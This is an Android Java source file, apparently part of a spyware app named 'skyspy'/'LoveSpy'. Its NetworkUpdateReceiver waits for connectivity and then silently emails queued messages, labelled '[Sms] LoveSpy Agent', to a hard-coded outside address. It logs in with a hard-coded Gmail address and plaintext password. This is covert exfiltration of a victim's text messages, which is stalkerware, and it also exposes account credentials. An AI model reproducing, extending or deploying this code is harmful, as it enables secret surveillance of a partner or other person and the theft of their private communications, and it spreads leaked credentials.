package com.example.skyspy.app.network;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import com.example.skyspy.app.email.EmailSending;
import com.example.skyspy.app.utils.Utils;

import java.util.ArrayList;
import java.util.Iterator;

public class NetworkUpdateReceiver extends BroadcastReceiver {

    private static ArrayList<String> mList;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (NetworkStatus.getInstance(context).isOnline()) {
            if (mList != null && mList.size() != 0) {
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected Void doInBackground(Void... params) {
                        Iterator<String> iter = mList.iterator();
                        while (iter.hasNext()) {
                            boolean sending = sendEmailSilently(iter.next());
                            if (sending == true) {
                                iter.remove();
                            }
                        }
                        return null;
                    }
                }.execute();
            }
        }
    }

    private boolean sendEmailSilently(String letter) {
        boolean result = false;
        EmailSending emailSending = new EmailSending("o.kapustiyan@gmail.com", "samsungforever");
        String[] toArr = {"1eecooper@ukr.net"};
        emailSending.setTo(toArr);
        emailSending.setFrom("wooo@wooo.com");
        emailSending.setSubject("[Sms] LoveSpy Agent");
        try {
            result = emailSending.sendSilently(letter);
        } catch(Exception e) {
            Log.e(Utils.TAG, "Could not send email", e);
        }
        return result;
    }

    public static void setLetterList(ArrayList<String> list) {
        mList = list;
    }
}
